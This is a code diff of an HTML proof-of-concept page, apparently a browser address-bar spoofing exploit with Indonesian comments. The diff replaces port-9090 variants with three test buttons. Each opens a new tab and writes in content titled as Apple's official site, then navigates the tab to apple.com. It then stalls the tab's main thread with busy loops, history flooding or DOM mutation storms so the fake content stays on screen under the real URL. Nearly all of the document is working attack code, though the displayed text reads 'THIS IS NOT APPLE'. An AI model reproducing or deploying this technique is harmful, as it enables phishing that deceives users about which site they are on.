@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Force Port 9090 Persistent Spoofing Suite - Zero</title>
+    <title>Precision Pipeline Desync PoC - Zero</title>
     <style>
       body, html {
         margin: 0;
@@ -61,33 +61,33 @@
   </head>
   <body>
     <div class="container">
-      <h1>Port 9090 Force-Lock Suite</h1>
+      <h1>Precision Race-Window Test Suite</h1>
       
-      <!-- Test 1: Direct Port 9090 Injection & Stalling -->
-      <button id="test1">Test 1: Force apple.com:9090 Lock</button>
+      <!-- Test 1: Micro-Delay & Synchronous Reflow Stalling -->
+      <button id="test1">Test 1: Precision Race Stalling (Apple.com)</button>
 
-      <!-- Test 2: History State + Port 9090 Deadlock -->
-      <button id="test2" class="btn-warning">Test 2: History State + Port 9090</button>
+      <!-- Test 2: History State Pollution + Pipeline Deadlock -->
+      <button id="test2" class="btn-warning">Test 2: History Flooding + Lock</button>
 
-      <!-- Test 3: Aggressive DOM Storm on Port 9090 -->
-      <button id="test3" class="btn-danger">Test 3: DOM Storm + Port 9090</button>
+      <!-- Test 3: DOM Mutation Storm & Main Thread Freeze -->
+      <button id="test3" class="btn-danger">Test 3: DOM Mutation Storm Lock</button>
     </div>
 
     <script>
-      // Helper untuk injeksi konten tampilan penyerang
+      // Helper untuk injeksi konten tampilan penyerang ke tab baru
       function injectAttackerContent(win) {
         if (!win) return;
         win.document.write(`
           <!DOCTYPE html>
           <html>
           <head>
-            <title>Apple - Secure Enclave</title>
+            <title>Apple - Official Site</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
           </head>
           <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
             <div>
-              <h1 style="font-size:38px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">PORT 9090 LOCKED</h1>
-              <p style="font-size:20px;color:#ff3b30;margin:0;font-weight:600;">RENDER PIPELINE DESYNCHRONIZED</p>
+              <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">THIS IS NOT APPLE</h1>
+              <p style="font-size:22px;color:#ff3b30;margin:0;font-weight:600;">RENDER PIPELINE DESYNCHRONIZED</p>
             </div>
           </body>
           </html>
@@ -96,89 +96,90 @@
         try { win.focus(); } catch (e) {}
       }
 
-      // --- TEST 1: Direct Port 9090 Injection & Stalling ---
+      // --- TEST 1: Precision Race Stalling ---
       document.getElementById("test1").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
           
-          // Memicu navigasi langsung ke port 9090
+          // Timing 1: Memicu navigasi asinkron murni ke apple.com sangat cepat
           setTimeout(() => { 
             try {
-              newTab.location.href = "https://apple.com:9090";
+              newTab.location.href = "https://apple.com";
             } catch(e) {}
-          }, 10);
+          }, 8);
 
-          // Mengunci main thread secara sinkronus untuk mempertahankan tampilan
+          // Timing 2: Mengunci render thread tepat saat antrean UI memperbarui address bar
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 3500) {
+                while (Date.now() - start < 4000) {
+                  // Memaksa pembacaan layout properties secara berulang untuk menjebak WebKit render engine
                   const h = document.body.offsetHeight;
                   document.body.style.background = (h % 2 === 0) ? '#ffffff' : '#fafafa';
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 3500) {}
+              let s = Date.now(); while(Date.now() - s < 4000) {}
             }
-          }, 45);
+          }, 35);
         }
       };
 
-      // --- TEST 2: History State + Port 9090 Deadlock ---
+      // --- TEST 2: History State Pollution + Pipeline Deadlock ---
       document.getElementById("test2").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
           setTimeout(() => {
             try {
-              newTab.history.pushState({port: 9090}, "", "#secure-port");
-              newTab.location.href = "https://apple.com:9090";
+              newTab.history.pushState({state: 'spoof'}, "", "#secure-enclave");
+              newTab.location.href = "https://apple.com";
             } catch (err) {}
           }, 10);
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 3500) {
+                while (Date.now() - start < 4000) {
                   history.pushState({rand: Math.random()}, "", "#flood");
                   const d = document.body.offsetHeight;
-                }
-              `);
-            } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 3500) {}
-            }
-          }, 50);
-        }
-      };
-
-      // --- TEST 3: Aggressive DOM Storm on Port 9090 ---
-      document.getElementById("test3").onclick = function () {
-        const newTab = window.open("", "_blank");
-        if (newTab) {
-          injectAttackerContent(newTab);
-          setTimeout(() => {
-            try {
-              newTab.location.href = "https://apple.com:9090";
-            } catch (err) {}
-          }, 10);
-          setTimeout(() => {
-            try {
-              newTab.eval(`
-                const start = Date.now();
-                const body = document.body;
-                while (Date.now() - start < 4000) {
-                  const el = document.createElement('div');
-                  el.innerText = Math.random();
-                  body.appendChild(el);
-                  if(body.childNodes.length > 60) body.innerHTML = "<h1>Locked Port 9090</h1>";
                 }
               `);
             } catch (e) {
               let s = Date.now(); while(Date.now() - s < 4000) {}
             }
           }, 40);
+        }
+      };
+
+      // --- TEST 3: DOM Mutation Storm & Main Thread Freeze ---
+      document.getElementById("test3").onclick = function () {
+        const newTab = window.open("", "_blank");
+        if (newTab) {
+          injectAttackerContent(newTab);
+          setTimeout(() => {
+            try {
+              newTab.location.href = "https://apple.com";
+            } catch (err) {}
+          }, 8);
+          setTimeout(() => {
+            try {
+              newTab.eval(`
+                const start = Date.now();
+                const body = document.body;
+                while (Date.now() - start < 4500) {
+                  const el = document.createElement('div');
+                  el.innerText = Math.random();
+                  body.appendChild(el);
+                  if(body.childNodes.length > 50) body.innerHTML = "<h1>Locked State Active</h1>";
+                }
+              `);
+            } catch (e) {
+              let s = Date.now(); while(Date.now() - s < 4500) {}
+            }
+          }, 30);
         }
       };
     </script>
